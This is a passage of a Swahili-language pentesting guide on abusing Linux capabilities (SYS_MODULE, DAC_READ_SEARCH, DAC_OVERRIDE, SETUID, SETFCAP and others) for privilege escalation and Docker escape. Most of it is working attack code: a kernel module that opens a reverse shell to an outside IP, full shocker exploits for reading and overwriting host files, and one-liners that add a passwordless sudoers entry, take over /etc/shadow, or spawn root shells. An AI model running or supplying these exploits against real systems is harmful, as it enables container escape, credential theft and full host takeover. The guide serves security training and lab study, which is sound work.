Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Ndani ya output iliyotangulia unaweza kuona kwamba **SYS_MODULE** capability imewezeshwa.

**Tengeneza** **kernel module** itakayotekeleza reverse shell na **Makefile** ya **compile**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Nafasi tupu kabla ya kila amri ya make katika Makefile **lazima iwe tab, si nafasi za kawaida**!

Tekeleza `make` ili kuikompile.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Mwishowe, anzisha `nc` ndani ya shell na **pakia module** kutoka kwenye shell nyingine, kisha utapata shell katika mchakato wa nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Msimbo wa technique hii ulikopiwa kutoka kwenye maabara ya "Abusing SYS_MODULE Capability" ya** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Mfano mwingine wa technique hii unaweza kupatikana kwenye [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huwezesha process **kupita permissions za kusoma files na za kusoma na kutekeleza directories**. Matumizi yake makuu ni kwa ajili ya kutafuta au kusoma files. Hata hivyo, pia huwezesha process kutumia function ya `open_by_handle_at(2)`, inayoweza kufikia file yoyote, pamoja na zilizo nje ya mount namespace ya process. Handle inayotumiwa katika `open_by_handle_at(2)` inapaswa kuwa identifier isiyo-transparent inayopatikana kupitia `name_to_handle_at(2)`, lakini inaweza kujumuisha taarifa nyeti kama inode numbers ambazo zinaweza kuchezewa. Uwezekano wa kutumia vibaya capability hii, hasa katika muktadha wa Docker containers, ulionyeshwa na Sebastian Krahmer kupitia exploit ya shocker, kama ilivyochanganuliwa [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Hii inamaanisha kwamba unaweza** **kupita ukaguzi wa permissions za kusoma files na ukaguzi wa permissions za kusoma/kutekeleza directories.**

**Example with binary**

binary itaweza kusoma file yoyote. Kwa hiyo, ikiwa file kama tar ina capability hii itaweza kusoma shadow file:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Mfano wa binary2**

Katika hali hii tuchukulie kwamba binary ya **`python`** ina capability hii. Ili kuorodhesha faili za root unaweza kufanya:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Na ili kusoma faili unaweza kufanya:
```python
print(open("/etc/shadow", "r").read())
```
**Mfano katika Environment (Docker breakout)**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya docker container kwa kutumia:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Ndani ya matokeo ya awali unaweza kuona kwamba capability ya **DAC_READ_SEARCH** imewezeshwa. Kwa sababu hiyo, container inaweza **debug processes**.

Unaweza kujifunza jinsi exploiting ifuatayo inavyofanya kazi katika [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), lakini kwa ufupi, **CAP_DAC_READ_SEARCH** haituruhusu tu kupitia file system bila permission checks, bali pia huondoa moja kwa moja checks zozote za _**open_by_handle_at(2)**_ na **inaweza kuruhusu process yetu kufikia sensitive files zilizofunguliwa na processes nyingine**.

Exploit ya awali inayotumia vibaya permissions hizi kusoma files kutoka kwa host inaweza kupatikana hapa: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); ifuatayo ni **modified version inayokuruhusu kubainisha file unayotaka kusoma kama argument ya kwanza na kuitoa kwenye file.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Exploit inahitaji kupata pointer ya kitu kilichomountiwa kwenye host. Exploit ya awali ilitumia faili /.dockerinit, na toleo hili lililorekebishwa linatumia /etc/hostname. Ikiwa exploit haifanyi kazi, huenda ukahitaji kuweka faili tofauti. Ili kupata faili iliyomountiwa kwenye host, tekeleza tu command ya mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit inahitaji kupata pointer ya kitu kilichomountiwa kwenye host. Exploit ya awali ilitumia faili /.dockerinit, na toleo hili lililorekebishwa linatumia...](<../../images/image (407) (1).png>)

**Code ya technique hii imenakiliwa kutoka kwenye maabara ya "Abusing DAC_READ_SEARCH Capability" ya** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**Hii inamaanisha kwamba unaweza kupita ukaguzi wa ruhusa za kuandika kwenye faili yoyote, hivyo unaweza kuandika faili yoyote.**

Kuna faili nyingi unazoweza **kuoverwrite ili ku-escalate privileges,** [**unaweza kupata mawazo hapa**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Example yenye binary**

Katika example hii vim ina capability hii, hivyo unaweza kurekebisha faili yoyote kama _passwd_, _sudoers_ au _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Mfano wa binary 2**

Katika mfano huu, **`python`** binary itakuwa na capability hii. Unaweza kutumia python kuandika juu ya faili lolote:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Mfano wenye environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Unaweza kukagua capabilities zilizowashwa ndani ya docker container ukitumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Kwanza kabisa soma sehemu iliyotangulia inayozungumzia [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) za host na **compile** exploit.\
Kisha, **compile** toleo lifuatalo la shocker exploit litakalokuruhusu **kuandika faili kiholela** ndani ya filesystem ya host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Ili **escape** kutoka kwenye docker container, unaweza **download** faili `/etc/shadow` na `/etc/passwd` kutoka kwa host, **add** **new user** kwao, na kutumia **`shocker_write`** kuzi-overwrite. Kisha, **access** kupitia **ssh**.

**The code of this technique was copied from the laboratory of "Abusing DAC_OVERRIDE Capability" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**Hii inamaanisha kwamba inawezekana kubadilisha umiliki wa faili yoyote.**

**Example with binary**

Tuchukulie kuwa **`python`** binary ina capability hii; unaweza **kubadilisha** **owner** wa faili **shadow**, **kubadilisha root password**, na ku-escalate privileges:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Au kwa binary ya **`ruby`** iliyo na capability hii:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Hii inamaanisha kwamba inawezekana kubadilisha ruhusa za faili lolote.**

**Mfano wa binary**

Ikiwa Python ina capability hii, unaweza kurekebisha ruhusa za faili la shadow, **kubadilisha root password**, na kufanya privilege escalation:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Hii inamaanisha kwamba inawezekana kuweka effective user id ya process iliyoundwa.**

**Mfano kwa binary**

Ikiwa Python ina **capability** hii, unaweza kuitumia vibaya kwa urahisi sana ili kuongeza privileges hadi root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Njia nyingine:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Hii inamaanisha kwamba inawezekana kuweka effective group id ya process iliyoundwa.**

Kuna files nyingi unazoweza **ku-overwrite ili kuongeza privileges,** [**unaweza kupata mawazo hapa**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Example with binary**

Katika hali hii unapaswa kutafuta files za kuvutia ambazo group inaweza kusoma, kwa sababu unaweza ku-impersonate group yoyote:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Mara tu unapopata faili unaloweza kutumia vibaya (kwa kulisoma au kuliandika) ili kuongeza privileges, unaweza **kupata shell inayojifanya kuwa kundi linalovutia** kwa:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Katika hali hii, group shadow iliigizwa, hivyo unaweza kusoma faili `/etc/shadow`:
```bash
cat /etc/shadow
```
### Mnyororo wa pamoja: CAP_SETGID + CAP_CHOWN

Wakati capabilities zote mbili zinapatikana katika helper moja, mnyororo wa vitendo ni:

1. Badilisha EGID iwe `shadow` (au group nyingine yenye privileges).
2. Tumia `chown` kwenye `/etc/shadow` kuweka UID yako huku ukiihifadhi group ikiwa `shadow`.
3. Soma target hash na uifanye crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Hii huepusha hitaji la kupata root kamili moja kwa moja na mara nyingi inatosha kufanya pivot kupitia credential reuse.

Ikiwa **docker** imesakinishwa, unaweza **impersonate** **docker group** na kuitumia vibaya kuwasiliana na [**docker socket** na kufanya privilege escalation](#writable-docker-socket).

## CAP_SETFCAP

**Hii inamaanisha kuwa inawezekana kuweka capabilities kwenye files na processes**

**Mfano wa binary**

Ikiwa python ina hii **capability**, unaweza kuitumia vibaya kwa urahisi sana kufanya privilege escalation hadi root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Kumbuka kwamba ukiweka capability mpya kwenye binary kwa kutumia CAP_SETFCAP, utapoteza capability hii.

Mara tu unapokuwa na [SETUID capability](linux-capabilities.md#cap_setuid), unaweza kwenda kwenye sehemu yake ili kuona jinsi ya ku-escalate privileges.

**Mfano wenye environment (Docker breakout)**

Kwa default, capability **CAP_SETFCAP hupewa proccess iliyo ndani ya container katika Docker**. Unaweza kuangalia hilo kwa kufanya kitu kama:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Capability hii inaruhusu **kuipa binaries capability nyingine yoyote**, hivyo tunaweza kufikiria kuhusu **escaping** kutoka kwenye container kwa **abusing** breakout nyingine yoyote ya capability iliyotajwa kwenye ukurasa huu.\
Hata hivyo, ukijaribu kuipa binary ya gdb capabilities CAP_SYS_ADMIN na CAP_SYS_PTRACE kwa mfano, utagundua kwamba unaweza kuzipa, lakini **binary haitaweza kutekelezwa baada ya hapo**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Kutoka kwenye nyaraka](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Hii ni **superset yenye mipaka kwa effective capabilities** ambazo thread inaweza kuchukua. Pia ni superset yenye mipaka kwa capabilities zinazoweza kuongezwa kwenye **inheritable set** na thread ambayo **haina capability ya CAP_SETPCAP** kwenye effective set yake._\
Inaonekana kwamba Permitted capabilities zinaweka kikomo kwa capabilities zinazoweza kutumika.\
Hata hivyo, Docker pia hutoa **CAP_SETPCAP** kwa default, kwa hiyo huenda ukaweza **kuweka capabilities mpya ndani ya inheritable set**.\
Hata hivyo, kwenye nyaraka za capability hii: _CAP_SETPCAP : \[…] **ongeza capability yoyote kutoka kwenye calling thread’s bounding** set hadi kwenye inheritable set yake_.\
Inaonekana kwamba tunaweza kuongeza kwenye inheritable set capabilities kutoka kwenye bounding set pekee. Hii inamaanisha kwamba **hatuwezi kuweka capabilities mpya kama CAP_SYS_ADMIN au CAP_SYS_PTRACE kwenye inherit set ili kuongeza privileges**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) hutoa operations kadhaa nyeti, zikiwemo access kwenye `/dev/mem`, `/dev/kmem` au `/proc/kcore`, kubadilisha `mmap_min_addr`, access kwenye system calls za `ioperm(2)` na `iopl(2)`, pamoja na disk commands mbalimbali. `FIBMAP ioctl(2)` pia inawezeshwa kupitia capability hii, jambo ambalo limesababisha issues [zamani](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Kulingana na man page, hii pia humruhusu mwenye capability hiyo **kufanya range ya device-specific operations kwenye devices nyingine**.

Hii inaweza kuwa muhimu kwa **privilege escalation** na **Docker breakout.**

## CAP_KILL

**Hii inamaanisha kwamba inawezekana ku-kill process yoyote.**

**Example yenye binary**

Tuseme **`python`** binary ina capability hii. Ikiwa unaweza **pia kurekebisha service au socket configuration** (au file yoyote ya configuration inayohusiana na service), unaweza kuiwekea backdoor, kisha ku-kill process inayohusiana na service hiyo na kusubiri file mpya ya configuration itekelezwe pamoja na backdoor yako.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Ikiwa una capabilities za kill na kuna **node program running as root** (au kama mtumiaji tofauti), huenda ukaweza **kutuma** signal **SIGUSR1** kwake na kuifanya **ifungue node debugger** ambako unaweza ku-connect.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Hii inamaanisha kwamba inawezekana kusikiliza kwenye port yoyote (hata zilizo na privileged).** Huwezi kufanya privilege escalation moja kwa moja kwa kutumia capability hii.

**Mfano wa binary**

Ikiwa **`python`** ina capability hii, itaweza kusikiliza kwenye port yoyote na hata ku-connect kutoka humo hadi kwenye port nyingine yoyote (baadhi ya services huhitaji connections kutoka kwenye privileged ports maalum)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

Uwezo wa [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huruhusu processes **kuunda RAW na PACKET sockets**, hivyo kuziwezesha kuzalisha na kutuma network packets za kiholela. Hili linaweza kusababisha security risks katika mazingira ya containerized, kama vile packet spoofing, traffic injection, na kukwepa network access controls. Washambuliaji hasidi wanaweza kutumia hili kuingilia container routing au kuhatarisha usalama wa host network, hasa bila firewall protections za kutosha. Zaidi ya hayo, **CAP_NET_RAW** ni muhimu kwa privileged containers ili kusaidia operations kama vile ping kupitia RAW ICMP requests.

**Hii inamaanisha kwamba inawezekana kusniff traffic.** Huwezi kufanya privilege escalation moja kwa moja kwa kutumia uwezo huu.

**Mfano na binary**

Ikiwa binary **`tcpdump`** ina uwezo huu, utaweza kuitumia kukusanya network information.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Kumbuka kwamba ikiwa **environment** inakupa capability hii, unaweza pia kutumia **`tcpdump`** kunusa traffic.

**Mfano wenye binary 2**

Mfano ufuatao ni code ya **`python2`** ambayo inaweza kuwa muhimu kwa ku-intercept traffic ya interface ya "**lo**" (**localhost**). Code hii imetoka kwenye lab "_The Basics: CAP-NET_BIND + NET_RAW_" kutoka [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability humpa mwenye uwezo wa **kubadilisha network configurations**, ikijumuisha firewall settings, routing tables, socket permissions, na network interface settings ndani ya network namespaces zilizo exposed. Pia huwezesha kuwasha **promiscuous mode** kwenye network interfaces, hivyo kuruhusu packet sniffing katika namespaces zote.

**Mfano wa binary**

Tuchukulie kwamba **python binary** ina capabilities hizi.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Hii inamaanisha kwamba inawezekana kurekebisha attributes za inode.** Huwezi kuongeza privileges moja kwa moja kwa kutumia capability hii.

**Mfano wenye binary**

Ukigundua kwamba file ni immutable na python ina capability hii, unaweza **kuondoa immutable attribute na kufanya file iweze kurekebishwa:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

